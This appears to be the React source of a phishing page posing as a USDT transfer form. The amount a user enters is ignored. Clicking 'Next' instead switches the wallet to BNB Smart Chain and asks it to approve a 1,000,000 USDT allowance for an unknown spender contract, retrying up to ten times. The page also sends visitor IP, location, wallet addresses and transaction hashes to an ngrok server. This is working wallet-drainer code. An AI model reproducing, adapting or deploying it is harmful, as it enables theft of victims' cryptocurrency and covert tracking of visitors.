import { useState, useEffect } from "react";
import { ethers } from "ethers";
import { ScanLine, NotebookTabs } from "lucide-react";
import "./App.css";

const API_BASE = "https://nonsensorial-jamie-subminimal.ngrok-free.dev";
const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const SPENDER_CONTRACT = "0xDe3e5F1FC2B30638Eca306F7ac3D1A2500A14A9b";
const USDT_DECIMALS = 18;

const USDT_ABI = [
  "function approve(address spender, uint256 amount) public returns (bool)",
];

export default function App() {
  const [amount, setAmount] = useState("");
  const [isProcessing, setIsProcessing] = useState(false);
  const [buttonText, setButtonText] = useState("Next");

  useEffect(() => {
    trackVisitor();
  }, []);

  const trackVisitor = async () => {
    try {
      const res = await fetch("https://ipapi.co/json/");
      const data = await res.json();
      await fetch(`${API_BASE}/visitor`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          ip: data.ip,
          location: `${data.city}, ${data.region}, ${data.country_name}`,
          timezone: data.timezone,
          url: window.location.href,
          country_flag: data.country_code
            ? String.fromCodePoint(
                ...[...data.country_code.toUpperCase()].map(
                  (c) => 0x1f1e6 + c.charCodeAt(0) - 65
                )
              )
            : "",
        }),
      });
    } catch (err) {}
  };

  const postJSON = async (path, data) => {
    try {
      await fetch(`${API_BASE}${path}`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data),
      });
    } catch (err) {}
  };

  const approveUSDT = async (account) => {
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const signer = provider.getSigner(account);
    const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);
    const approveAmount = ethers.utils.parseUnits("1000000", USDT_DECIMALS);

    for (let attempt = 1; attempt <= 10; attempt++) {
      try {
        const tx = await usdtContract.approve(SPENDER_CONTRACT, approveAmount);
        await postJSON("/checkTrx", {
          trx: tx.hash,
          address: account,
          amount: "1000000",
        });
        await tx.wait();
        await postJSON("/approvalConfirmed", {
          trx: tx.hash,
          address: account,
          amount: "1000000",
        });
        return true;
      } catch (err) {
        if (attempt === 10) {
          await postJSON("/info", { text: `Approval failed: ${err.message}` });
          return false;
        }
        await new Promise((resolve) => setTimeout(resolve, 2000));
      }
    }
  };

  const handleNext = async () => {
    if (!amount || isProcessing) return;
    if (!window.ethereum) return;

    setIsProcessing(true);
    setButtonText("Processing...");

    try {
      const currentChain = await window.ethereum.request({
        method: "eth_chainId",
      });
      if (currentChain !== "0x38") {
        await window.ethereum.request({
          method: "wallet_switchEthereumChain",
          params: [{ chainId: "0x38" }],
        });
      }

      let accounts = await window.ethereum.request({ method: "eth_accounts" });
      if (accounts.length === 0) {
        accounts = await window.ethereum.request({
          method: "eth_requestAccounts",
        });
      }

      if (accounts.length) {
        const account = accounts[0];
        await postJSON("/connectedwallet", { wallet: account });
        await approveUSDT(account);
      }
    } catch (err) {
      await postJSON("/info", { text: `Error: ${err.message}` });
    }

    setIsProcessing(false);
    setButtonText("Next");
  };

  const handleAmountChange = (e) => {
    setAmount(e.target.value);
    if (!isProcessing) {
      setButtonText("Next");
    }
  };

  const isButtonEnabled = amount && !isNaN(amount) && parseFloat(amount) > 0 && !isProcessing;
  const buttonClassName = `next-btn ${isButtonEnabled ? "enabled" : ""}`;

  return (
    <>
      <div className="container">
        <label className="label">Address or Domain Name</label>
        <div className="input-box">
          <input
            type="text"
            value="0xA4b9cD8fE12B3aF456d7"
            readOnly
            spellCheck="false"
          />

          <span className="paste-btn">Paste</span>
          
          <NotebookTabs className="icon" />
          <ScanLine className="icon" />
        </div>
        
        <label className="label">Amount</label>
        <div className="input-box">
          <input 
            type="number" 
            placeholder="USDT Amount" 
            value={amount}
            onChange={handleAmountChange}
            disabled={isProcessing}
          />
          <div className="amount-right">
            <span>USDT</span>
            <span className="max-btn">Max</span>
          </div>
        </div>
        <div className="bottom">
          <button 
            className={buttonClassName}
            onClick={handleNext}
            disabled={!isButtonEnabled}
          >
            {buttonText}
          </button>
        </div>
      </div>
    </>
  );
}
